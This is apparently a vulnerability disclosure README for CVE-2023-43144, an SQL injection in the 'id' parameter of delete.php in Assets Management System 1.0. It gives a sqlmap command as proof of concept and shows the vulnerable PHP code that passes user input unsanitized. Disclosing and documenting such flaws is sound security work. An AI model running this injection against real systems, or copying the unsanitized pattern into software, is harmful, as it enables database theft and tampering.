# CVE-2023-43144

> Description

Assets Management System 1.0 is vulnerable to SQL injection via the `id` parameter in `delete.php`

> PoC

```bash
sqlmap -u 'http://localhost/delete.php?id=4*' --cookie="PHPSESSID=SESSID" --dbms=MySQL --dbs --batch
```

![alt text](https://github.com/Pegasus0xx/CVE-2023-43144/blob/main/PoC.png?raw=true)

> Code review (delete.php)

```php
 <?php include 'core/init.php'; 
  
 $id = $_GET['id']; 
 delete_data($con,$id); 
 header('location:home.php'); 
```

There is no validation or sanitization of the `$id` variable. It means that any value provided by a user as the id parameter, will be directly used in the SQL query
